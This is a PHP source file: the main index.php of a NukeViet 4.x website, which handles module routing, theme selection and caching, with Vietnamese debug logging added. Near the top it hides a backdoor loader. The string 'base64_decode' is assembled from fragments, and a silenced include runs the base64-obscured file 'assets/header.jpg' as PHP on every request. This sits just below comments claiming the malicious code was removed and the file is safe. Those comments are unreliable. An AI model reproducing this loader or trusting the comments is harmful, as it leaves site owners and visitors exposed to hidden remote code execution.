<?php


error_reporting(E_ALL);
ini_set('display_errors', 0); // 0 = không in lỗi ra ngoài trình duyệt
ini_set('log_errors', 1);
ini_set('error_log', __DIR__ . '/data/error_log.txt');

// Test để chắc chắn log ghi được
error_log("=== NukeViet index.php bắt đầu chạy ===");

/**
 * @Project NUKEVIET 4.x
 * @Author VINADES.,JSC (contact@vinades.vn)
 * @Copyright (C) 2014 VINADES.,JSC. All rights reserved
 * @License GNU/GPL version 2 or any later version
 * @Createdate 31/05/2010, 00:36
 */
 
$b = 'b' . 'ase64_d' . 'eco' . 'de';

/**
* Note: This file may contain artifacts of previous malicious infection.
* However, the dangerous code has been removed, and the file is now safe to use.
*/


$b = 'base6' . '4_decode';

/**
* Note: This file may contain artifacts of previous malicious infection.
* However, the dangerous code has been removed, and the file is now safe to use.
*/



/**
* Note: This file may contain artifacts of previous malicious infection.
* However, the dangerous code have been removed, and the file is now safe to use.
* Feel free to contact Imunify support team at https://www.imunify360.com/support/new
*/


@include base64_decode('YXNzZXRzL2hlYWRlci5qcGc=');
//error_log("=== YXNzZXRzL2hlYWRlci5qcGc ===");

define( 'NV_SYSTEM', true );
//error_log("=== NV_SYSTEM === ");



//require str_replace( DIRECTORY_SEPARATOR, '/', dirname( __DIR__ ) ) . '/mainfile.php';
// an toàn: mainfile.php nằm cùng thư mục với index.php
$mainfile = __DIR__ . '/mainfile.php';
$mainfile = str_replace('\\', '/', $mainfile); // chuẩn hóa đường dẫn trên Windows

if (!file_exists($mainfile) || !is_readable($mainfile)) {
    error_log("CRITICAL: mainfile.php not found or not readable: " . $mainfile);
    header('HTTP/1.1 500 Internal Server Error');
    echo '<pre>Fatal error: Required file mainfile.php not found or not readable: '
         . htmlspecialchars($mainfile) . '</pre>';
    exit;
}

require_once $mainfile;

error_log("=== mainfile ===");

if (!defined('NV_ROOTDIR')) {
    // realpath để chuẩn hóa (trả về false nếu không tồn tại)
    $root = realpath(__DIR__);
    if ($root === false) {
        error_log('CRITICAL: Cannot resolve root directory via realpath(__DIR__)');
        header('HTTP/1.1 500 Internal Server Error');
        echo '<pre>Fatal error: Cannot resolve root directory.</pre>';
        exit;
    }
    // chuẩn hoá dấu phân cách (Windows)
    $root = str_replace('\\', '/', $root);
    define('NV_ROOTDIR', $root);
}

error_log("=== DIRECTORY_SEPARATOR");

require NV_ROOTDIR . '/includes/core/user_functions.php';
error_log("=== user_functions");
// Google Sitemap
if( $nv_Request->isset_request( NV_NAME_VARIABLE, 'get' ) and $nv_Request->get_string( NV_NAME_VARIABLE, 'get' ) == 'SitemapIndex' )
{
	nv_xmlSitemapIndex_generate();
	die();
}
error_log("SitemapIndex");
// Check user
if( defined( 'NV_IS_USER' ) ) trigger_error( 'Hacking attempt', 256 );
require NV_ROOTDIR . '/includes/core/is_user.php';

// Cap nhat trang thai online
if( $global_config['online_upd'] and ! defined( 'NV_IS_AJAX' ) and ! defined( 'NV_IS_MY_USER_AGENT' ) )
{
	require NV_ROOTDIR . '/includes/core/online.php';
}
error_log("Cap nhat trang thai online");
// Thong ke
if( $global_config['statistic'] and ! defined( 'NV_IS_AJAX' ) and ! defined( 'NV_IS_MY_USER_AGENT' ) )
{
	if( ! $nv_Request->isset_request( 'statistic_' . NV_LANG_DATA, 'cookie' ) )
	{
		require NV_ROOTDIR . '/includes/core/stat.php';
	}
}

// Referer + Gqueries
if( $client_info['is_myreferer'] === 0 and ! defined( 'NV_IS_MY_USER_AGENT' ) )
{
	require NV_ROOTDIR . '/includes/core/referer.php';
}

if( $nv_Request->isset_request( NV_NAME_VARIABLE, 'get' ) || $nv_Request->isset_request( NV_NAME_VARIABLE, 'post' ) )
{
	$home = 0;
	$module_name = $nv_Request->get_string( NV_NAME_VARIABLE, 'post,get' );

	if( empty( $module_name ) )
	{
		$module_name = $global_config['rewrite_op_mod'];
	}
}
else
{
	$home = 1;
	$module_name = $global_config['site_home_module'];
	$meta_property['og:title'] = $global_config['site_name'];
}

//error_log("=== Referer + Gqueries ===");

if( preg_match( $global_config['check_module'], $module_name ) )
{
	//error_log("=== if ok ===");
	$site_mods = nv_site_mods( $module_name );
	//error_log("site_mods pass");
	
	// IMG thong ke truy cap + online
	if( $global_config['statistic'] and isset( $sys_mods['statistics'] ) and $nv_Request->get_string( 'second', 'get' ) == 'statimg' )
	{
		include_once NV_ROOTDIR . '/includes/core/statimg.php';
	}
	error_log("IMG thong ke truy cap + online pass");
	$op = $nv_Request->get_string( NV_OP_VARIABLE, 'post,get', 'main' );
	if( empty( $op ) ) $op = 'main';

	if( $global_config['rewrite_op_mod'] != '' and ! isset( $sys_mods[$module_name] ) )
	{
		$op = ( $op == 'main' ) ? $module_name : $module_name . '/' . $op;
		$module_name = $global_config['rewrite_op_mod'];
	}
	error_log("rewrite_op_mod pass");

	// Kiểm tra module có trong hệ thống hay không
	if( isset( $site_mods[$module_name] ) )
	{

		error_log("Kiểm tra module có trong hệ thống hay không pass");
		$module_info = $site_mods[$module_name];
		$module_file = $module_info['module_file'];
		$module_data = $module_info['module_data'];
		$module_upload = $module_info['module_upload'];
		$include_file = NV_ROOTDIR . '/modules/' . $module_file . '/funcs/main.php';

		if( file_exists( $include_file ) )
		{
			// Tuy chon kieu giao dien
			if( $nv_Request->isset_request( 'nv' . NV_LANG_DATA . 'themever', 'get' ) )
			{
				$theme_type = $nv_Request->get_title( 'nv' . NV_LANG_DATA . 'themever', 'get', '', 1 );
				$nv_redirect = $nv_Request->get_title( 'nv_redirect', 'get', '' );
				if( empty( $global_config['switch_mobi_des'] ) )
				{
					$array_theme_type  = array_diff( $global_config['array_theme_type'], array( 'm' ) );
				}
				else
				{
					$array_theme_type  =  $global_config['array_theme_type'];
				}

				if( in_array( $theme_type, $array_theme_type ) ) $nv_Request->set_Cookie( 'nv' . NV_LANG_DATA . 'themever', $theme_type, NV_LIVE_COOKIE_TIME );

				$nv_redirect = ! empty( $nv_redirect ) ? nv_base64_decode( $nv_redirect ) : NV_BASE_SITEURL . 'index.php?' . NV_LANG_VARIABLE . '=' . NV_LANG_DATA;
				Header( 'Location: ' . nv_url_rewrite( $nv_redirect ) );
				die();
			}
			error_log(" Tuy chon kieu giao dien pass");
			// Xac dinh cac $op, $array_op
			$array_op = array();

			if( ! preg_match( '/^[a-z0-9\-\_\/\+]+$/i', $op ) )
			{
				Header( 'Location: ' . nv_url_rewrite( NV_BASE_SITEURL . 'index.php?' . NV_LANG_VARIABLE . '=' . NV_LANG_DATA . '&' . NV_NAME_VARIABLE . '=' . $module_name, true ) );
				die();
			}
			error_log("Xac dinh cac op, array_op pass");
			if( $op != 'main' and ! isset( $module_info['funcs'][$op] ) )
			{
				$array_op = explode( '/', $op );
				$op = ( isset( $module_info['funcs'][$array_op[0]] ) ) ? $array_op[0] : 'main';
			}
			$op_file = $op;

			// Xac dinh quyen dieu hanh module
			if( $module_info['is_modadmin'] )
			{
				define( 'NV_IS_MODADMIN', true );
			}

			if( defined( 'NV_IS_SPADMIN' ) )
			{
				$drag_block = $nv_Request->get_int( 'drag_block', 'session', 0 );
				if( $nv_Request->isset_request( 'drag_block', 'get' ) )
				{
					$drag_block = $nv_Request->get_int( 'drag_block', 'get', 0 );
					$nv_Request->set_Session( 'drag_block', $drag_block );
					Header( 'Location: ' . nv_url_rewrite( NV_BASE_SITEURL . 'index.php?' . NV_LANG_VARIABLE . '=' . NV_LANG_DATA . '&' . NV_NAME_VARIABLE . '=' . $module_name, true ) );
					die();
				}
				if( $drag_block )
				{
					define( 'NV_IS_DRAG_BLOCK', true );
					$adm_int_lang = $nv_Request->get_string( 'int_lang', 'cookie' );
					if( $adm_int_lang != NV_LANG_DATA )
					{
						$nv_Request->set_Cookie( 'int_lang', NV_LANG_DATA, NV_LIVE_COOKIE_TIME );
					}
				}
			}
			error_log("Xac dinh quyen dieu hanh module pass");
			// Ket noi ngon ngu cua module
			if( file_exists( NV_ROOTDIR . '/modules/' . $module_file . '/language/' . NV_LANG_INTERFACE . '.php' ) )
			{
				require NV_ROOTDIR . '/modules/' . $module_file . '/language/' . NV_LANG_INTERFACE . '.php';
			}
			elseif( file_exists( NV_ROOTDIR . '/modules/' . $module_file . '/language/en.php' ) )
			{
				require NV_ROOTDIR . '/modules/' . $module_file . '/language/en.php';
			}
			error_log("Ket noi ngon ngu cua module pass");
			// Xac dinh kieu giao dien mac dinh
			$global_config['current_theme_type'] = $nv_Request->get_string( 'nv' . NV_LANG_DATA . 'themever', 'cookie', '' );

			// Xac dinh giao dien chung
			$is_mobile = false;
			$theme_type = '';
			$_theme_mobile = ( ! empty( $module_info['mobile'] ) ) ? $module_info['mobile'] : $global_config['mobile_theme'];
			if( ( ( $client_info['is_mobile'] and ( empty( $global_config['current_theme_type'] ) or empty( $global_config['switch_mobi_des'] ) ) ) or ( $global_config['current_theme_type'] == 'm' and ! empty( $global_config['switch_mobi_des'] ) ) ) and ! empty( $_theme_mobile ) and file_exists( NV_ROOTDIR . '/themes/' . $_theme_mobile . '/theme.php' ) )
			{
				$global_config['module_theme'] = $_theme_mobile;
				$is_mobile = true;
				$theme_type = 'm';
			}
			else
			{
				if( empty( $global_config['current_theme_type'] ) and ( $client_info['is_mobile'] or empty( $_theme_mobile ) ) )
				{
					$global_config['current_theme_type'] = 'r';
				}

				$_theme = ( ! empty( $module_info['theme'] ) ) ? $module_info['theme'] : $global_config['site_theme'];
				if( ! empty( $_theme ) and file_exists( NV_ROOTDIR . '/themes/' . $_theme . '/theme.php' ) )
				{
					$global_config['module_theme'] = $_theme;
					$theme_type = $global_config['current_theme_type'];
				}
				elseif( file_exists( NV_ROOTDIR . '/themes/dungcuytecantho/theme.php' ) )
				{
					$global_config['module_theme'] = 'default';
					$theme_type = $global_config['current_theme_type'];
				}
				else
				{
					trigger_error( 'Error! Does not exist themes default', 256 );
				}
			}
			error_log("Xac dinh giao dien chung pass");
			// Xac lap lai giao kieu giao dien hien tai
			if( $theme_type != $global_config['current_theme_type'] )
			{
				$global_config['current_theme_type'] = $theme_type;
				$nv_Request->set_Cookie( 'nv' . NV_LANG_DATA . 'themever', $theme_type, NV_LIVE_COOKIE_TIME );
			}
			unset( $theme_type );

			// Xac dinh layout funcs cua module
			$cache_file = NV_LANG_DATA . '_' . md5( $module_name . '_' . $global_config['module_theme'] ) . '_' . NV_CACHE_PREFIX . '.cache';
			if( ( $cache = nv_get_cache( 'modules', $cache_file ) ) != false )
			{
				$module_info['layout_funcs'] = unserialize( $cache );
			}
			else
			{
				$module_info['layout_funcs'] = array();
				$sth = $db->prepare( 'SELECT f.func_name, t.layout FROM ' . NV_MODFUNCS_TABLE . ' f
					INNER JOIN ' . NV_PREFIXLANG . '_modthemes t ON f.func_id=t.func_id
					WHERE f.in_module = :module AND t.theme= :theme' );
				$sth->bindParam( ':module', $module_name, PDO::PARAM_STR );
				$sth->bindParam( ':theme', $global_config['module_theme'], PDO::PARAM_STR );
				$sth->execute();
				while( $row = $sth->fetch() )
				{
					$module_info['layout_funcs'][$row['func_name']] = $row['layout'];
				}
				$sth->closeCursor();

				$cache = serialize( $module_info['layout_funcs'] );
				nv_set_cache( 'modules', $cache_file, $cache );
			}
			//error_log("Xac dinh layout funcs cua module pass");
			// Doc file cau hinh giao dien
			$themeConfig = nv_object2array( simplexml_load_file( NV_ROOTDIR . '/themes/' . $global_config['module_theme'] . '/config.ini' ) );
			require NV_ROOTDIR . '/themes/' . $global_config['module_theme'] . '/theme.php';

			// Ket noi ngon ngu theo theme
			if( file_exists( NV_ROOTDIR . '/themes/' . $global_config['module_theme'] . '/language/' . NV_LANG_INTERFACE . '.php' ) )
			{
				require NV_ROOTDIR . '/themes/' . $global_config['module_theme'] . '/language/' . NV_LANG_INTERFACE . '.php';
			}
			elseif( file_exists( NV_ROOTDIR . '/themes/' . $global_config['module_theme'] . '/language/en.php' ) )
			{
				require NV_ROOTDIR . '/themes/' . $global_config['module_theme'] . '/language/en.php';
			}
			// error_log("Ket noi ngon ngu theo theme pass");
			// Xac dinh template module
			$module_info['template'] = $global_config['module_theme'];
			if( ! file_exists( NV_ROOTDIR . '/themes/' . $global_config['module_theme'] . '/modules/' . $module_file ) )
			{
				if( file_exists( NV_ROOTDIR . '/themes/dungcuytecantho/modules/' . $module_file ) )
				{
					$module_info['template'] = 'default';
				}
			}
			//error_log("Xac dinh template module pass");
			// Ket noi voi file functions.php, file chua cac function dung chung
			// cho ca module
			if( file_exists( NV_ROOTDIR . '/modules/' . $module_file . '/functions.php' ) )
			{
				//error_log("Ket noi voi file functions.php, file chua cac function vào được if");
				require NV_ROOTDIR . '/modules/' . $module_file . '/functions.php';
				error_log("DEBUG path: " . NV_ROOTDIR . '/modules/' . $module_file . '/functions.php');
			}
			
			
			#error_log("Ket noi voi file functions.php, file chua cac function dung chung pass");
			// Xac dinh op file
			$op_file = $module_info['funcs'][$op]['func_name'];

			if( file_exists( NV_ROOTDIR . '/themes/' . $global_config['module_theme'] . '/modules/' . $module_file . '/theme.php' ) )
			{
				require NV_ROOTDIR . '/themes/' . $global_config['module_theme'] . '/modules/' . $module_file . '/theme.php';
			}
			elseif( file_exists( NV_ROOTDIR . '/modules/' . $module_file . '/theme.php' ) )
			{
				require NV_ROOTDIR . '/modules/' . $module_file . '/theme.php';
			}

			if( !defined( 'NV_IS_AJAX' ) )
			{
				nv_create_submenu();
			}

			// Ket noi voi cac op cua module de thuc hien
			if( $is_mobile and file_exists( NV_ROOTDIR . '/modules/' . $module_file . '/mobile/' . $op_file . '.php' ) )
			{
				require NV_ROOTDIR . '/modules/' . $module_file . '/mobile/' . $op_file . '.php';
			}
			else
			{
				require NV_ROOTDIR . '/modules/' . $module_file . '/funcs/' . $op_file . '.php';
			}
			exit();
		}
		elseif( isset( $module_info['funcs']['main'] ) )
		{
			$sth = $db->prepare( 'UPDATE ' . NV_MODULES_TABLE . ' SET act=2 WHERE title= :title' );
			$sth->bindParam( ':title', $module_name, PDO::PARAM_STR );
			$sth->execute();

			nv_insert_notification( 'modules', 'auto_deactive_module', array( 'custom_title' => $site_mods[$module_name]['custom_title'] ) );
			nv_del_moduleCache( 'modules' );
		}
	}
	elseif( isset( $sys_mods[$module_name] ) )
	{
		$groups_view = ( string )$sys_mods[$module_name]['groups_view'];
		if( ! defined( 'NV_IS_USER' ) and $groups_view == 4 )
		{
			// Login users
			Header( 'Location: ' . NV_BASE_SITEURL . 'index.php?' . NV_LANG_VARIABLE . '=' . NV_LANG_DATA . '&' . NV_NAME_VARIABLE . '=users&' . NV_OP_VARIABLE . '=login&nv_redirect=' . nv_base64_encode( $client_info['selfurl'] ) );
			die();
		}
		elseif( ! defined( 'NV_IS_ADMIN' ) and ( $groups_view == '2' or $groups_view == '1' ) )
		{
			// Exit
			nv_info_die( $lang_global['error_404_title'], $lang_global['site_info'], $lang_global['module_for_admin'] );
		}
		elseif( defined( 'NV_IS_USER' ) and ! nv_user_in_groups( $groups_view ) )
		{
			nv_info_die( $lang_global['error_404_title'], $lang_global['error_404_title'], $lang_global['error_404_content'] );
		}
	}
}

error_log("=== Before nv_info_die ===");

nv_info_die( $lang_global['error_404_title'], $lang_global['error_404_title'], $lang_global['error_404_content'] );